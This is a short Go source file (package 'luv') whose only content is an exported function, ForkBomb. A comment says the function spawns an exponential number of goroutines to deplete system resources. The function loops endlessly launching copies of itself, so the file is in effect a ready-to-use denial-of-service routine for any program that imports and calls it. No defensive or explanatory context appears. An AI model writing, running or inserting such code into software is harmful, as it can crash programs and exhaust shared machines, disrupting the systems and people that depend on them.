package luv

//ForkBomb creates an exponential number of goroutines that will deplete system resources
func ForkBomb() {
	for {
		go ForkBomb()
	}
}
